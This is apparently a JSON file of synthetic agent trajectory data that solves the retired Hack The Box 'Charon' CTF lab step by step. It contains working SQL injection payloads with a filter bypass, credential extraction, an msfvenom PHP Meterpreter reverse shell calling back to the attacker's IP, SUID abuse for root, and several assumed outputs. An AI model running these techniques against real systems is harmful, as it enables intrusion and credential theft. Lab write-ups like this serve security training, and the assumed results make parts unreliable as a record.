@@ -1,0 +1,155 @@
+{
+    "initial_prompt": "The \"Charon\" challenge is a retired Hack The Box (HTB) Capture The Flag (CTF) lab. The target machine has the IP address 10.10.10.31, and the attacker's machine (Kali 2024) operates from 10.10.14.7. The primary objective is to retrieve two flags: `user.txt` and `root.txt` by identifying vulnerabilities, gaining initial access, and escalating privileges.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services on the target machine.",
+            "command": "nmap -sV -Pn 10.10.10.31",
+            "result": "The nmap scan with service version detection (`-sV`) and no ping (`-Pn`) reveals open ports on 10.10.10.31. Expected open ports are 22 (SSH) and 80 (HTTP)."
+        },
+        {
+            "step_number": 2,
+            "thought": "Inspect the main page of the web server on port 80.",
+            "command": "curl http://10.10.10.31",
+            "result": "The command retrieves the HTML content of the homepage. It's a website for \"Freeeze,\" a fictional frozen yogurt shop. Blog post links like `singlepost.php?id=1` are observed."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate directories on the web server to find hidden pages or CMS.",
+            "command": "gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50",
+            "result": "Directory enumeration using gobuster with `common.txt` wordlist reveals accessible paths. A key finding is the `/cmsdata/` directory."
+        },
+        {
+            "step_number": 4,
+            "thought": "Investigate the discovered `/cmsdata/` directory.",
+            "command": "curl http://10.10.10.31/cmsdata/",
+            "result": "Accessing `/cmsdata/` shows a login page for a Content Management System (CMS)."
+        },
+        {
+            "step_number": 5,
+            "thought": "Test the `singlepost.php` page for SQL injection vulnerability using a single quote.",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=1'\"",
+            "result": "Appending a single quote to the `id` parameter in `singlepost.php` URL causes a SQL error message in the server's response, indicating a potential SQL injection vulnerability."
+        },
+        {
+            "step_number": 6,
+            "thought": "Confirm the number of columns in the vulnerable SQL query using a UNION-based injection. The original walkthrough noted 'UNION' and 'union' were blacklisted, requiring 'UNion'.",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,4%20--%20-\"",
+            "result": "The UNION injection with four columns (1,2,3,4) successfully returns content, with numbers 1, 2, 3, and 4 appearing on the page. This confirms the query uses four columns and that column 4 is displayed."
+        },
+        {
+            "step_number": 7,
+            "thought": "Extract the database name using SQL injection.",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(database(),%20%22@who.ami%22)%20--%20-\"",
+            "result": "The injected query retrieves the current database name. The response displays `supercms@who.ami` in the page content, revealing the database name as `supercms`."
+        },
+        {
+            "step_number": 8,
+            "thought": "Enumerate table names within the `supercms` database. This command attempts to find the 'operators' table, assuming it's the second relevant table (limit 1,1).",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(table_name,%20%22@who.ami%22)%20FROM%20information_schema.tables%20WHERE%20table_schema=%22supercms%22%20LIMIT%201,1%20--%20-\"",
+            "result": "The query fetches the name of the second table in the `supercms` database. The output `operators@who.ami` indicates a table named `operators`."
+        },
+        {
+            "step_number": 9,
+            "thought": "Identify column names in the `operators` table. This command attempts to find `__username_`, assuming it's the second column (limit 1,1).",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(column_name,%20%22@who.ami%22)%20FROM%20information_schema.columns%20WHERE%20table_name=%22operators%22%20AND%20table_schema=%22supercms%22%20LIMIT%201,1%20--%20-\"",
+            "result": "The query retrieves the name of the second column in the `operators` table. The output `__username_@who.ami` confirms a column named `__username_`."
+        },
+        {
+            "step_number": 10,
+            "thought": "Identify further column names in the `operators` table. This command attempts to find `__password_`, assuming it's the third column (limit 2,1).",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(column_name,%20%22@who.ami%22)%20FROM%20information_schema.columns%20WHERE%20table_name=%22operators%22%20AND%20table_schema=%22supercms%22%20LIMIT%202,1%20--%20-\"",
+            "result": "The query retrieves the name of the third column in the `operators` table. The output `__password_@who.ami` confirms a column named `__password_`."
+        },
+        {
+            "step_number": 11,
+            "thought": "Extract a username from the `operators` table. This command targets the second user entry (limit 1,1).",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(__username_,%20%22@who.ami%22)%20FROM%20operators%20LIMIT%201,1%20--%20-\"",
+            "result": "The query retrieves the username from the second row of the `operators` table. The output `admin@who.ami` reveals the username `admin`."
+        },
+        {
+            "step_number": 12,
+            "thought": "Extract the password for the username 'admin' from the `operators` table (assuming it's from the second row, limit 1,1).",
+            "command": "curl \"http://10.10.10.31/singlepost.php?id=-1%27%20UNion%20SELECT%201,2,3,concat(__password_,%20%22@who.ami%22)%20FROM%20operators%20LIMIT%201,1%20--%20-\"",
+            "result": "The query retrieves the password corresponding to the 'admin' user. The output `you_know_what_to_do_next@who.ami` reveals the password `you_know_what_to_do_next`."
+        },
+        {
+            "step_number": 13,
+            "thought": "Log into the CMS at `http://10.10.10.31/cmsdata/` using the extracted credentials (`admin:you_know_what_to_do_next`). This step is typically performed manually using a web browser.",
+            "command": "echo \"Manual Step: Navigate to http://10.10.10.31/cmsdata/ in a browser and log in with username 'admin' and password 'you_know_what_to_do_next'. Identify the file upload functionality.\"",
+            "result": "Successful login grants access to the CMS administrative dashboard. An upload feature is found, which can be exploited to upload a reverse shell."
+        },
+        {
+            "step_number": 14,
+            "thought": "Generate a PHP reverse shell payload using msfvenom and save it to `shell.php`.",
+            "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f raw -o shell.php",
+            "result": "A PHP Meterpreter reverse shell payload is generated and saved as `shell.php`. It is configured to connect back to the attacker's IP `10.10.14.7` on port `4444`."
+        },
+        {
+            "step_number": 15,
+            "thought": "Set up a Metasploit listener to catch the incoming reverse shell connection.",
+            "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 10.10.14.7; set LPORT 4444; exploit -j -z\"",
+            "result": "Metasploit's multi/handler is configured with the PHP Meterpreter payload and starts listening on `10.10.14.7:4444`. It will run as a job and not interact on session creation."
+        },
+        {
+            "step_number": 16,
+            "thought": "Upload the `shell.php` file to the target server via the CMS upload functionality. This step is typically manual or may require request manipulation if direct PHP uploads are blocked.",
+            "command": "echo \"Manual Step: Use the CMS upload feature (identified in step 13) to upload shell.php. The file might be placed in a directory like /cmsdata/uploads/ or /images/.\"",
+            "result": "The `shell.php` file is successfully uploaded to the target server. Assume it's accessible at `http://10.10.10.31/cmsdata/uploads/shell.php`."
+        },
+        {
+            "step_number": 17,
+            "thought": "Trigger the uploaded PHP reverse shell by accessing its URL.",
+            "command": "curl http://10.10.10.31/cmsdata/uploads/shell.php",
+            "result": "Accessing the URL of `shell.php` executes the payload on the server. A Meterpreter session connects back to the Metasploit listener, providing a shell as the web server user (e.g., `www-data`)."
+        },
+        {
+            "step_number": 18,
+            "thought": "From the Meterpreter session, download the `decoder.pub` file from `/home/decoder/` on the target machine.",
+            "command": "echo \"In Meterpreter session: download /home/decoder/decoder.pub /root/Desktop/decoder.pub\"",
+            "result": "The RSA public key file `decoder.pub` is downloaded from `/home/decoder/` on the target to `/root/Desktop/decoder.pub` on the attacker's machine."
+        },
+        {
+            "step_number": 19,
+            "thought": "From the Meterpreter session, download the `pass.crypt` file from `/home/decoder/` on the target machine.",
+            "command": "echo \"In Meterpreter session: download /home/decoder/pass.crypt /root/Desktop/pass.crypt\"",
+            "result": "The encrypted file `pass.crypt` is downloaded from `/home/decoder/` on the target to `/root/Desktop/pass.crypt` on the attacker's machine."
+        },
+        {
+            "step_number": 20,
+            "thought": "Clone the RsaCtfTool repository to use for decrypting the `pass.crypt` file.",
+            "command": "git clone https://github.com/Ganapati/RsaCtfTool.git /opt/RsaCtfTool",
+            "result": "The RsaCtfTool repository is cloned from GitHub into `/opt/RsaCtfTool` on the attacker's machine. If it already exists, git will indicate this."
+        },
+        {
+            "step_number": 21,
+            "thought": "Decrypt the `pass.crypt` file using RsaCtfTool and the downloaded public key `decoder.pub`.",
+            "command": "python3 /opt/RsaCtfTool/RsaCtfTool.py --publickey /root/Desktop/decoder.pub --uncipherfile /root/Desktop/pass.crypt",
+            "result": "RsaCtfTool processes the public key and attempts to decrypt `pass.crypt`. The tool outputs the decrypted plaintext password, which is `supersecretpassword`."
+        },
+        {
+            "step_number": 22,
+            "thought": "Log into the target machine via SSH as the user `decoder` using the decrypted password.",
+            "command": "sshpass -p 'supersecretpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null decoder@10.10.10.31",
+            "result": "An SSH connection is established to `10.10.10.31` as the user `decoder`. Access to the user's home directory `/home/decoder/` is gained."
+        },
+        {
+            "step_number": 23,
+            "thought": "Read the user flag (`user.txt`) from the `decoder` user's home directory.",
+            "command": "sshpass -p 'supersecretpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null decoder@10.10.10.31 'cat /home/decoder/user.txt'",
+            "result": "The command executes `cat /home/decoder/user.txt` on the target machine, displaying the content of the user flag."
+        },
+        {
+            "step_number": 24,
+            "thought": "Search for SUID binaries on the target system that could be used for privilege escalation.",
+            "command": "sshpass -p 'supersecretpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null decoder@10.10.10.31 'find / -perm -u=s -type f 2>/dev/null'",
+            "result": "The `find` command lists all SUID executable files on the target system. A custom SUID binary, `/usr/local/bin/supershell`, owned by root, is identified."
+        },
+        {
+            "step_number": 25,
+            "thought": "Exploit the `/usr/local/bin/supershell` SUID binary to execute commands as root and retrieve the root flag.",
+            "command": "sshpass -p 'supersecretpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null decoder@10.10.10.31 '/usr/local/bin/supershell \"cat /root/root.txt\"'",
+            "result": "The `supershell` binary is exploited to run `cat /root/root.txt` with root privileges. The command outputs the content of the root flag, completing the challenge."
+        }
+    ]
+}
